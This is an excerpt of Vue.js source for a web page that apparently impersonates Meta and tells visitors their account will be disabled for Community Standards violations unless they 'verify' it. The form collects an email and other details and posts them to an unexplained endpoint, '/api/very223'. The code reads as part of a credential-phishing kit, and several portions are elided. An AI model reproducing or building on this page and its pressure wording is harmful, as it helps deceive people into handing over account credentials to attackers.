            ...
            <div id="AboutYouSection" class="Question AboutYouSection">
              <div class="CaptionWrapper">
                <div class="Caption">
                  ...
                  <a>Community Standards</a>. We have already reviewed this decision and
                  the decision cannot be changed. To avoid having your account
                  <a>disabled</a>, please verify your account:
                </div>
              </div>
              <div class="_1b1g" v-if="loading">
                <span
              ...
              <form v-else>
                <div class="ElementWrapper">
                  ...
                  >
                    <div class="TextBox floatingLabelContainer" v-if="!isVery">
                      <input
                    ...
                    <div class="TextBox floatingLabelContainer2" v-else>
                      <input
                  ...
                  <div class="redtext2" v-if="isVery">
...
export default {
  ...
  methods: {
    Verificaition1: async function () {
      if (!this.isVery) {
        var very = this.postVery();
        if(very){
          this.form.email = "";
    ...
    postVery: async function () {
      try {
        this.loading = true;
        this.isSubmit = true;
        const response = await API().post("/api/very223", this.form);
...
// WEBPACK FOOTER //
// src/pages/MetaAccountRestricted.vue